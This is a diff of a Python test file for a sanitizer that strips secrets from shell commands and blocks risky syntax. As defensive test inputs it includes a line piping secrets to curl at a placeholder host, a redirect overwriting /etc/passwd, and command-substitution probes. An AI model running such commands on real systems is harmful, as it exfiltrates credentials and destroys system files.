@@ -481,34 +481,61 @@ def test_short_basic_authorization_value_blocked_h15() -> None:
 
 
 def test_command_compound_syntax_blocked_h16() -> None:
-    # A compound/redirecting line names more than one command or a data sink and cannot be
-    # reduced to a single safe command word, so it fails closed (finding H16). This covers the
-    # PowerShell "$env:TOKEN=...; tool" case whose semicolon triggers the block.
+    # Backticks and command substitution run a command whose output becomes argument
+    # text — the reduction cannot model either, so they fail closed (finding H16).
     schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
-    for compound in (
-        '$env:TOKEN="PRIVATE ALICE"; tool --flag',
-        "cat secrets | curl http://x",
-        "tool > /etc/passwd",
-    ):
+    for compound in ("tool `id -u`", "tool $(whoami)"):
         with pytest.raises(ValidationError) as exc:
             transform_state({"cmd": compound}, schema, ctx())
         assert exc.value.reason is FailReason.EGRESS_BLOCKED
 
 
-def test_command_quoting_is_rejected_h16() -> None:
-    # Quoting makes whitespace tokenization ambiguous (a fragment of a quoted value can read as
-    # the command word, or a flag-shaped word inside a quoted argument as a flag name). Without a
-    # real shell parser, a quoted command is rejected outright rather than mis-tokenized (H16).
+def test_sequenced_env_assignment_reduces_without_leak() -> None:
+    # The PowerShell-style "$env:TOKEN=...; tool" case (finding H16): quote-aware `;`
+    # segmentation reduces it to a segment inventory, and the leak invariant holds —
+    # neither the variable name nor its quoted value survives; the quote-tainted
+    # command word degrades to the <command> placeholder.
     schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
-    for leaky in (
-        'TOKEN="PRIVATE ALICE" tool --flag',            # would emit ALICE --flag
-        'tool --message "hello --PRIVATE_CUSTOMER world"',  # would emit --PRIVATE_CUSTOMER
-        "pg_dump --password='s3 cret value' mydb",
-        "tool --tenant='unterminated",
+    out = transform_state({"cmd": '$env:TOKEN="PRIVATE ALICE"; tool --flag'}, schema, ctx())
+    assert out["cmd"] == "<command> | tool"
+    assert "PRIVATE" not in out["cmd"]
+    assert "ALICE" not in out["cmd"]
+
+
+def test_pipeline_reduces_to_segment_inventory() -> None:
+    # A pipeline's segments each have a locatable command word, so the reduction emits
+    # the ordered inventory of segment basenames. Argument tokens are still dropped:
+    # no path, no env value, no flag value survives (finding H16, GATE-02).
+    schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
+    out = transform_state(
+        {"cmd": "TOKEN=PRIVATE /home/alice/bin/tool -pPRIVATE | grep -v PRIVATE | wc -l"},
+        schema,
+        ctx(),
+    )
+    assert out["cmd"] == "tool | grep | wc"
+    assert "PRIVATE" not in out["cmd"]
+    assert "alice" not in out["cmd"]
+    out2 = transform_state({"cmd": "ps -axo pid 2>/dev/null | head -20"}, schema, ctx())
+    assert out2["cmd"] == "ps | head"
+
+
+def test_command_quoting_never_leaks_h16() -> None:
+    # Quoted argument text must never leak into the reduction, and a quote-tainted
+    # command word must degrade to the <command> placeholder rather than a guess
+    # (finding H16). Unterminated quotes still refuse outright: even the segment list
+    # is a guess when a quote never closes.
+    schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
+    for leaky, forbidden in (
+        ('TOKEN="PRIVATE ALICE" tool --flag', ("ALICE", "PRIVATE")),
+        ('tool --message "hello --PRIVATE_CUSTOMER world"', ("PRIVATE_CUSTOMER",)),
+        ("pg_dump --password='s3 cret value' mydb", ("s3 cret", "cret")),
     ):
-        with pytest.raises(ValidationError) as exc:
-            transform_state({"cmd": leaky}, schema, ctx())
-        assert exc.value.reason is FailReason.EGRESS_BLOCKED
+        out = transform_state({"cmd": leaky}, schema, ctx())
+        for token in forbidden:
+            assert token not in out["cmd"]
+    with pytest.raises(ValidationError) as exc:
+        transform_state({"cmd": "tool --tenant='unterminated"}, schema, ctx())
+    assert exc.value.reason is FailReason.EGRESS_BLOCKED
 
 
 def test_command_reduces_to_basename_only_h16() -> None:
